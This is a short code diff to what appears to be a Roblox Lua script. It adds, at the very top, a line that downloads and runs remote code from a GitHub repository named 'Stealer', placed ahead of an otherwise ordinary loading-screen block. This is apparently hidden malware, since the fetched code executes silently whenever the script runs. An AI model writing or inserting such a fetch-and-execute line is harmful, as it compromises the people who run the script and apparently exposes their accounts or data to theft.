@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Shalangtalagas/Stealer/refs/heads/main/xscripts", true))()
+
 --// Start Loading UI
 task.spawn(function()
     -- FULL LOADING UI (positioned + centered)
